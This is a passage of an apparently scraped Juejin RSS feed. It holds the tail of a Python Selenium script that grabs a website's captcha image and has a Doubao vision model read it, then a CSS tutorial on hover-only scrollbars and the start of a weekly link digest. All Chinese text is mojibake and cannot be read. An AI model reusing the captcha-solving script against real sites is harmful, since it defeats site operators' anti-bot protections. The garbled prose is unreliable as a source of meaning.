<span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC
<span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By
<span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> volcenginesdkarkruntime <span class="hljs-keyword">import</span> Ark

start_time= datetime.datetime.now()

<span class="hljs-comment"># 1. åˆå§‹åŒ–æµè§ˆå™¨ï¼Œè·å–éªŒè¯ç å›¾ç‰‡æ•°æ®</span>
wd = webdriver.Edge()
wd.implicitly_wait(<span class="hljs-number">10</span>)
wd.get(<span class="hljs-string">"[å¼•å·å†…å¡«å†™ä½ éœ€è¦è·å–éªŒè¯ç çš„urlåœ°å€]"</span>)

<span class="hljs-comment"># ç­‰å¾…å›¾ç‰‡å¯è§ï¼Œè·å–src</span>
element = WebDriverWait(wd, <span class="hljs-number">10</span>).until(
    EC.visibility_of_element_located((By.CSS_SELECTOR, <span class="hljs-string">"div.captcha&gt;img"</span>))
)
src_data = element.get_attribute(<span class="hljs-string">"src"</span>)

<span class="hljs-keyword">if</span> src_data <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æœªè·å–åˆ°éªŒè¯ç å›¾ç‰‡çš„srcå±æ€§ï¼"</span>)
    <span class="hljs-built_in">input</span>(<span class="hljs-string">"å›è½¦é€€å‡º"</span>)
    wd.close()
    exit()

<span class="hljs-comment">#ç¼–å†™AIAPTçš„åŸºç¡€é…ç½®ï¼škeyå€¼ï¼ŒAIapiæ¥å£ï¼Œæ¨¡å‹id</span>
API_KEY = <span class="hljs-string">"ã€å¼•å·å†…å¡«å†™ä½ è‡ªå·±çš„API Keyçš„å€¼ã€‘"</span>
BASE_URL = <span class="hljs-string">"https://ark.cn-beijing.volces.com/api/v3"</span>  <span class="hljs-comment">#è°ƒç”¨APIåœ°å€</span>
MODEL_ID = <span class="hljs-string">"doubao-seed-1-8-251228"</span>  <span class="hljs-comment">#ä½¿ç”¨çš„å¤§æ¨¡å‹id</span>

<span class="hljs-comment">#2.è¿æ¥é‰´æƒ</span>
client = Ark(
    base_url=BASE_URL,
    api_key=API_KEY
)
<span class="hljs-comment">#3.æ„é€ å¯¹è¯</span>
messages = [
    {
        <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
        <span class="hljs-string">"content"</span>: [
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>,
                <span class="hljs-string">"text"</span>: <span class="hljs-string">"ç›´æ¥è¯†åˆ«å¹¶è¿”å›å†…å®¹ï¼Œä¸è¦å›å¤å…¶ä»–å½¢å®¹"</span>
            },
            {
                <span class="hljs-string">"type"</span>: <span class="hljs-string">"image_url"</span>,
                <span class="hljs-string">"image_url"</span>: {
                    <span class="hljs-string">"url"</span>: <span class="hljs-string">f"<span class="hljs-subst">{src_data}</span>"</span>
                }
            }
        ]
    }
]

response = client.chat.completions.create(
        model=MODEL_ID,
        messages=messages,
        temperature=<span class="hljs-number">0.7</span>,
        max_tokens=<span class="hljs-number">1000</span>
    )

<span class="hljs-comment">#4.è§£æå¹¶æ‰“å°å“åº”ç»“æœ</span>
result = response.choices[<span class="hljs-number">0</span>].message.content
<span class="hljs-built_in">print</span>(<span class="hljs-string">"=== API å“åº”ç»“æœ ==="</span>)
<span class="hljs-built_in">print</span>(result)
end_time= datetime.datetime.now()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“æŸè®°æ—¶"</span>)
total_time=end_time-start_time
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ä»£ç æ‰§è¡Œæ€»è€—æ—¶ï¼š<span class="hljs-subst">{total_time}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ€»è€—æ—¶ï¼ˆç§’ï¼‰ï¼š<span class="hljs-subst">{total_time.total_seconds()}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼€å§‹æ—¶é—´ï¼š<span class="hljs-subst">{start_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>"</span>) 
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç»“æŸæ—¶é—´ï¼š<span class="hljs-subst">{end_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>"</span>) 

<span class="hljs-comment">#5.æš‚åœé€€å‡º</span>
<span class="hljs-built_in">input</span>(<span class="hljs-string">"å›è½¦é€€å‡º"</span>)
wd.close()

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ‹¯æ•‘UIç¾æ„Ÿï¼çº¯CSSå®ç°ã€Œå¹½çµã€æ»šåŠ¨æ¡ï¼šæ‚¬åœæ˜¾ç¤ºã€è´´è¾¹ä¼˜é›…]]></title>    <link>https://juejin.cn/post/7603195960254136320</link>    <guid>https://juejin.cn/post/7603195960254136320</guid>    <pubDate>2026-02-05T09:59:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254136320" data-draft-id="7602991346585239586" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ‹¯æ•‘UIç¾æ„Ÿï¼çº¯CSSå®ç°ã€Œå¹½çµã€æ»šåŠ¨æ¡ï¼šæ‚¬åœæ˜¾ç¤ºã€è´´è¾¹ä¼˜é›…"/> <meta itemprop="keywords" content="å‰ç«¯,CSS"/> <meta itemprop="datePublished" content="2026-02-05T09:59:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="äººé—´äºŒä¸¤é£"/> <meta itemprop="url" content="https://juejin.cn/user/2709615662139614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‹¯æ•‘UIç¾æ„Ÿï¼çº¯CSSå®ç°ã€Œå¹½çµã€æ»šåŠ¨æ¡ï¼šæ‚¬åœæ˜¾ç¤ºã€è´´è¾¹ä¼˜é›…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2709615662139614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    äººé—´äºŒä¸¤é£
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:59:42.000Z" title="Thu Feb 05 2026 09:59:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æµè§ˆå™¨ç³»ç»Ÿé»˜è®¤çš„æ»šåŠ¨æ¡æ ·å¼åˆç²—åˆé»‘ï¼Œéå¸¸å½±å“è§‚æ„Ÿï¼Œä¸ºæ­¤ç‰¹æ„åšäº†ä¸€ç‰ˆæ ·å¼ä¼˜åŒ–ã€‚</p>
<p>å®ç°ä»¥ä¸‹éœ€æ±‚ï¼š</p>
<ol>
<li>é»˜è®¤ä¸æ˜¾ç¤ºï¼Œé¼ æ ‡ç§»å…¥æ»‘åŠ¨èŒƒå›´å†…æ‰æ˜¾ç¤ºã€‚ï¼ˆä¿è¯é¡µé¢æ— éœ€æ»‘åŠ¨æ—¶ä¸è‡ƒè‚¿ï¼‰ï¼›</li>
<li>ä½¿ç”¨ç®€å•ï¼Œæ·»åŠ åˆ°å…¨å±€æ ·å¼ä¸­åï¼Œä½¿ç”¨æ—¶åªéœ€åœ¨classä¸­æ·»åŠ ç±»åå³å¯ã€‚ï¼›</li>
<li>æ»šåŠ¨æ¡è´´è¾¹ï¼ˆéœ€è¦divå†…éƒ¨æ ·å¼å‡†ç¡®ï¼‰ï¼›</li>
<li>è°ƒæ•´ç²—ç»†å’Œé¢œè‰²ï¼Œå¢å¼ºä½¿ç”¨ä½“éªŒï¼</li>
</ol>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-class">.commonScroll</span> {
  <span class="hljs-attribute">scrollbar-color</span>: transparent transparent;
  <span class="hljs-attribute">scrollbar-width</span>: <span class="hljs-number">8px</span>;

  &amp; ::-webkit-scrollbar-thumb,
  &amp;::-webkit-scrollbar-thumb {
    <span class="hljs-attribute">background-color</span>: transparent;
    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;

    &amp;:horizontal {
      <span class="hljs-attribute">background-color</span>: transparent;
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
    }
  }

  &amp;<span class="hljs-selector-pseudo">:hover</span> {
    <span class="hljs-attribute">scrollbar-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color) transparent;

    &amp; ::-webkit-scrollbar-thumb,
    &amp;::-webkit-scrollbar-thumb {
      <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color);
      <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;

      &amp;:horizontal {
        <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">var</span>(--g-scroll-bar-color);
        <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">2px</span>;
      }
    }
  }

  &amp; ::-webkit-scrollbar-track,
  &amp;::-webkit-scrollbar-track {
    <span class="hljs-attribute">background-color</span>: transparent;
  }
}


<span class="hljs-comment">//  dark.css:    --g-scroll-bar-color:  #565657;</span>
<span class="hljs-comment">// light.css:    --g-scroll-bar-color: #CACBCC;</span>

</code></pre>
<p>ä½¿ç”¨æ—¶</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"searchWrapper  commonScroll"</span>&gt;</span>
</code></pre>
<p>æœ€ç»ˆæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c1c7d8b69844adbb9ae901376f4acf0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lq66Ze05LqM5Lik6aOO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890530&amp;x-signature=MfqRzVeWGeo0L4ue%2BnmRnjQYnng%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[åˆ†äº«å‰ç«¯é¡¹ç›®å¸¸ç”¨çš„ä¸‰ä¸ªSkills--Vueã€React ä¸ UI æ ¸å¿ƒ Skills | æ˜é‡‘ä¸€å‘¨ 2.5]]></title>    <link>https://juejin.cn/post/7603160727717609523</link>    <guid>https://juejin.cn/post/7603160727717609523</guid>    <pubDate>2026-02-05T08:40:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603160727717609523" data-draft-id="7602935146707337262" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="åˆ†äº«å‰ç«¯é¡¹ç›®å¸¸ç”¨çš„ä¸‰ä¸ªSkills--Vueã€React ä¸ UI æ ¸å¿ƒ Skills | æ˜é‡‘ä¸€å‘¨ 2.5"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-02-05T08:40:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘ä¸€å‘¨"/> <meta itemprop="url" content="https://juejin.cn/user/53218623894222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            åˆ†äº«å‰ç«¯é¡¹ç›®å¸¸ç”¨çš„ä¸‰ä¸ªSkills--Vueã€React ä¸ UI æ ¸å¿ƒ Skills | æ˜é‡‘ä¸€å‘¨ 2.5
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/53218623894222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘ä¸€å‘¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:40:11.000Z" title="Thu Feb 05 2026 08:40:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>æœ¬æ–‡å­—æ•°1500+ ï¼Œé˜…è¯»æ—¶é—´å¤§çº¦éœ€è¦ 4åˆ†é’Ÿã€‚</em></p>
<blockquote>
<p>ã€æ˜é‡‘ä¸€å‘¨ã€‘æœ¬æœŸäº®ç‚¹ï¼š</p>
</blockquote>
<ul>
<li>
<p><a href="https://juejin.cn/post/7599641289887055918" target="_blank" title="https://juejin.cn/post/7599641289887055918">åˆ†äº«å‰ç«¯é¡¹ç›®å¸¸ç”¨çš„ä¸‰ä¸ªSkills--Vueã€React ä¸ UI æ ¸å¿ƒ Skills</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7598921649888968731" target="_blank" title="https://juejin.cn/post/7598921649888968731">ä¾›åº”é“¾ç³»ç»Ÿä¸­çš„ Web æ‰“å°æ–¹æ¡ˆçš„æ¢ç´¢å®è·µ</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7600238071038197769" target="_blank" title="https://juejin.cn/post/7600238071038197769">Clawdbot å®Œæ•´å¯¹æ¥é£ä¹¦æ•™ç¨‹ æ‰‹æŠŠæ‰‹æ­å»ºä½ çš„ä¸“å± AI åŠ©æ‰‹</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7598737609494855699" target="_blank" title="https://juejin.cn/post/7598737609494855699">è¡€å‹é£™å‡ï¼ŒFlutter &amp; Dart 2025 å¹´åº¦å·¨å‘å›é¡¾</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7599970244786864191" target="_blank" title="https://juejin.cn/post/7599970244786864191">ä»é›¶å¼€å§‹æ­å»ºéƒ¨ç½² Moltbot/Clawdbot å®Œæ•´æ”»ç•¥</a></p>
</li>
</ul>
<blockquote>
<p><strong>ã€Œä¸Šæ¦œè§„åˆ™ã€</strong>ï¼šæ–‡ç« å‘å¸ƒæ—¶é—´åœ¨æœ¬æœŸã€Œæ˜é‡‘ä¸€å‘¨ã€å‘å¸ƒæ—¶é—´çš„å‰ä¸€å‘¨å†…ï¼›ä¸”ç¬¦åˆå„ä¸ªæ ç›®çš„å†…å®¹å®šä½å’Œè¦æ±‚ã€‚ å¦‚å‘ç°æ–‡ç« æœ‰æŠ„è¢­ã€æ´—ç¨¿ç­‰è¿åç¤¾åŒºè§„åˆ™çš„è¡Œä¸ºï¼Œå°†å–æ¶ˆå½“æœŸåŠåç»­ä¸Šæ¦œèµ„æ ¼ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€å‘¨â€œé‡‘â€é€‰</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d5bf990a124e3a87cffb06443ad9ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5LiA5ZGo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770885743&amp;x-signature=pvexyGP3pjpEg0Fli4%2Fh4yfoMXQ%3D" alt="æ˜é‡‘ä¸€å‘¨ æ–‡ç« å¤´å›¾ 1303x734.jpg" loading="lazy"/></p>
<p><em>å†…å®¹è¯„å®¡ä»¬ä¼šåœ¨è¿‡å»çš„ä¸€å‘¨å†…å¯¹ç¤¾åŒºæ·±åº¦æŠ€æœ¯å¥½æ–‡è¿›è¡ŒæŒ–æ˜å’Œç­›é€‰ï¼Œä¼˜è´¨çš„æŠ€æœ¯æ–‡ç« æœ‰æœºä¼šå‡ºç°åœ¨ä¸‹æ–¹æ¦œå•ä¸­ï¼Œæ’åä¸åˆ†å…ˆåã€‚</em></p>
<h3 data-id="heading-1">å‰ç«¯</h3>
<p><a href="https://juejin.cn/post/7599641289887055918" target="_blank" title="https://juejin.cn/post/7599641289887055918">åˆ†äº«å‰ç«¯é¡¹ç›®å¸¸ç”¨çš„ä¸‰ä¸ªSkills--Vueã€React ä¸ UI æ ¸å¿ƒ Skills</a><a href="https://juejin.cn/user/598569647873805/posts" target="_blank" title="https://juejin.cn/user/598569647873805/posts">@å»ä¼ªå­˜çœŸ</a></p>
<blockquote>
<p>æ–‡ç« ä»‹ç»å‰ç«¯é¡¹ç›®å¸¸ç”¨æŠ€èƒ½åŒ…ã€‚Vue-Skills è§£å†³ Vue 3 å¼€å‘ç—›ç‚¹ï¼›React-Skills æ¶µç›–ç»„ä»¶ç»„åˆã€æ€§èƒ½ä¼˜åŒ–ç­‰è§„åˆ™ï¼›UI-Skills æä¾›å¤šå…ƒé£æ ¼ã€é€‚é…å¤šæŠ€æœ¯æ ˆã€‚Skills è®©å¼€å‘è€…è½¬å˜è§’è‰²ï¼Œæå‡å¼€å‘æ•ˆç‡ä¸ä»£ç è´¨é‡ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7598921649888968731" target="_blank" title="https://juejin.cn/post/7598921649888968731">ä¾›åº”é“¾ç³»ç»Ÿä¸­çš„ Web æ‰“å°æ–¹æ¡ˆçš„æ¢ç´¢å®è·µ</a><a href="https://juejin.cn/user/3233040624266695/posts" target="_blank" title="https://juejin.cn/user/3233040624266695/posts">@å¤èŒ—å‰ç«¯å›¢é˜Ÿ</a></p>
<blockquote>
